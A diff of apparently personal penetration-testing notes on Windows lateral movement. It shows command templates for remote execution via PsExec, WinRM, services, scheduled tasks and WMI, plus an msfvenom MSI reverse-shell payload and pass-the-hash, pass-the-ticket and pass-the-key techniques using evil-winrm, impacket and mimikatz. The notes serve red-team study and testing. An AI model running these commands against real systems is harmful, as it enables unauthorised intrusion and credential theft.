@@ -2,7 +2,29 @@
 title: Windows lateral movement notes
 ---
 
-## Process spawning via PsExec
+- [1. Process spawning via PsExec](#1-process-spawning-via-psexec)
+- [2. Process spawning via WinRM](#2-process-spawning-via-winrm)
+  - [2.1. Quick method](#21-quick-method)
+  - [2.2. Pure PowerShell method](#22-pure-powershell-method)
+- [3. Command execution via services](#3-command-execution-via-services)
+  - [3.1. Service creation](#31-service-creation)
+  - [3.2. Reverse shell](#32-reverse-shell)
+- [4. Command execution via scheduled tasks](#4-command-execution-via-scheduled-tasks)
+- [5. Abusing WMI](#5-abusing-wmi)
+  - [5.1. Establishing WMI session](#51-establishing-wmi-session)
+  - [5.2. Reverse shell via MSI packages](#52-reverse-shell-via-msi-packages)
+  - [5.3. Command execution (blind)](#53-command-execution-blind)
+  - [5.4. Service creation (blind)](#54-service-creation-blind)
+  - [5.5. Scheduled task creation (blind)](#55-scheduled-task-creation-blind)
+- [6. NTLM](#6-ntlm)
+  - [6.1. Pass-the-Hash](#61-pass-the-hash)
+- [7. Kerberos](#7-kerberos)
+  - [7.1. Pass-the-Ticket](#71-pass-the-ticket)
+  - [7.2. Pass-the-Key](#72-pass-the-key)
+    - [7.2.1. Overpass-the-Hash](#721-overpass-the-hash)
+- [8. RDP hijacking](#8-rdp-hijacking)
+
+## 1. Process spawning via PsExec
 PsExec is Sysinternals tool. It can execute processes remotely on any machine where we can access. PsExec uses SMB protocol (445/TCP). Target account must be a member of _Administrators_ group.
 
 PsExec workflow:
@@ -15,16 +37,16 @@ PsExec workflow:
 psexec64.exe \\<target-ip> -u <user> -p <password> -i "cmd.exe"
 ```
 
-## Process spawning via WinRM
+## 2. Process spawning via WinRM
 Main purpose of the WinRM protocol is to run PowerShell commands remotely. It can be used to the lateral movement. Target account must be member of the _Remote Management Users_ group.
 
-### Quick method
+### 2.1. Quick method
 
 ```powershell
 winrs.exe -u:<user> -p:<password> -r:<target-ip> "cmd.exe"
 ```
 
-### Pure PowerShell method
+### 2.2. Pure PowerShell method
 
 ```powershell
 $username = '<user>';
@@ -35,7 +57,7 @@ Enter-PSSession -Computername <target-ip> -Credential $credential
 Invoke-Command -Computername <target-ip> -Credential $credential -ScriptBlock {whoami}
 ```
 
-## Command execution via services
+## 3. Command execution via services
 Windows services can be used to run arbitrary commands because they execute a command when started. Standard tool for creating a service on remote host is the `sc.exe`. It exploits default ability of Windows services to execute arbitrary commands at the start of the service. Target account must be member of the _Administrators_ group. The victim's OS is in charge of starting the service, so the attacker is not be able to look at the command's output - it's blind attack.
 
 It tries to connect to the Service Control Manager (SVCCTL) throught RPC in two ways:
@@ -64,7 +86,7 @@ sc.exe \\<target-ip> stop <service>
 sc.exe \\<target-ip> delete <service>
 ```
 
-### Service creation
+### 3.1. Service creation
 
 ```powershell
 $ServiceName = "<service-name>"
@@ -86,10 +108,10 @@ Invoke-CimMethod -InputObject $Service -MethodName StopService
 Invoke-CimMethod -InputObject $Service -MethodName Delete
 ```
 
-### Reverse shell
+### 3.2. Reverse shell
 If we try to run a reverse shell using this method, the reverse shell disconnects immediately after execution. Service executables are different to standard `.exe` files, and therefore non-service executables are killed by the service manager almost immediately. `Msfvenom` supports the `exe-service` format, which will encapsulate any payload inside a fully functional service executable, preventing it from getting killed.
 
-## Command execution via scheduled tasks
+## 4. Command execution via scheduled tasks
 Scheduled tasks can be created remotely. The `schtasks` tool is available in any Windows installation. The victim's OS is in charge of running the scheduled task, so the attacker is not able to look at the command's output - it's blind attack.
 
 > NOTE: The victim's OS is in charge of running the scheduled task, you won't be able to look at the command output.
@@ -105,12 +127,12 @@ schtasks /s <target-ip> /run /TN <task-name>
 schtasks /S <target-ip> /TN <task-name> /DELETE /F
 ```
 
-## Abusing WMI
+## 5. Abusing WMI
 WMI allows administrators to perform standard management tasks that attacker can abuse to perform lateral movement. Abusing WMI an attacker is able to remotely create a process or a scheduled task, run a service, install a MSI package.
 
 WMI provides **bunch of ways to perform lateral movement** but first of all WMI session must be established:
 
-### Establishing WMI session
+### 5.1. Establishing WMI session
 
 ```powershell
 $Username = "<target-user>";
@@ -126,7 +148,7 @@ $Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-Cimsession -ComputerName $TargetHost -Credential $Credential -SessionOption $Opt -ErrorAction Stop
 ```
 
-### Reverse shell via MSI packages
+### 5.2. Reverse shell via MSI packages
 
 ```powershell
 # Generate MSI reverse shell payload 
@@ -136,7 +158,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4443 -f ms
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package-path.msi>"; Options = ""; AllUsers = $false}
 ```
 
-### Command execution (blind)
+### 5.3. Command execution (blind)
 
 ```powershell
 # Execute a command remotely (blind)
@@ -144,7 +166,7 @@ $Command = "<cmd-payload>"
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
 ```
 
-### Service creation (blind)
+### 5.4. Service creation (blind)
 
 ```powershell
 $ServiceName = "<service-name>"
@@ -166,7 +188,7 @@ Invoke-CimMethod -InputObject $Service -MethodName StopService
 Invoke-CimMethod -InputObject $Service -MethodName Delete
 ```
 
-### Scheduled task creation (blind)
+### 5.5. Scheduled task creation (blind)
 
 ```powershell
 $Command = "<cmd-payload>"
@@ -182,19 +204,26 @@ Start-ScheduledTask -CimSession $Session -TaskName $TaskName
 Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
 ```
 
-## NTLM
+## 6. NTLM
 
-### Pass-the-Hash
-As a result of extracting credentials from a host an attacker might get NT hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself.
+### 6.1. Pass-the-Hash
+As a result of extracting credentials from a host an attacker might get NT hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself. PtH attacks can work over a large number of technologies, either using Windows-Windows or Linux-Windows tools.
+
+Here's the great [overview of different technologies](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/). Sometimes certain technology might not work, then it's worth to check another one.
+
+> Some of the technologies that might be used to perform PtH: SMB, WinRM, PsExec, WMI, RPC, RDP.
 
 ```bash
-# Get shell using NT hash
+# Get shell via WinRM
 evil-winrm -i <victim-ip> -u <username> -H <nt-hash>
+
+# Get shell via SMB (PsExec)
+impacket-psexec -hashes <NT:LM> <username@target-ip>
 ```
 
-## Kerberos
+## 7. Kerberos
 
-### Pass-the-Ticket
+### 7.1. Pass-the-Ticket
 Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz` or `rubeus`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services. Injecting ticket in our own session doesn't require administrator privileges.
 
 ```powershell
@@ -208,7 +237,7 @@ klist
 dir \\<dc-ip>\C$
 ```
 
-### Pass-the-Key
+### 7.2. Pass-the-Key
 When a user requests a TGT it must prove its identity to the KDC. The key derived from user's password is used for this purpose (both the KDC and the user posses the key). The key is used to encrypt a timestamp sent by the user during the TGT requesting process. There is a couple possible key formats (DES, RC4, AES-128, AES-256). They depends on the algorithm used to encrypt the timestamp (Windows version and Kerberos configuration). If an attacker obtain any of these keys, he can ask the KDC for a TGT without providing the actual user's password.
 
 ```powershell
@@ -219,10 +248,10 @@ When a user requests a TGT it must prove its identity to the KDC. The key derive
 
 > **NOTE**: Available algorithms: `rc4`, `aes128`, `aes256`.
 
-#### Overpass-the-Hash
+#### 7.2.1. Overpass-the-Hash
 If the RC4 algorithm is used, the RC4 key is equal to the NT hash of a user. It means that if an attacker is able to steal the NT hash, he would be able to request the TGT even if the NTLM authentication is disabled.
 
-## RDP hijacking
+## 8. RDP hijacking
 TBD
 
 ```powershell
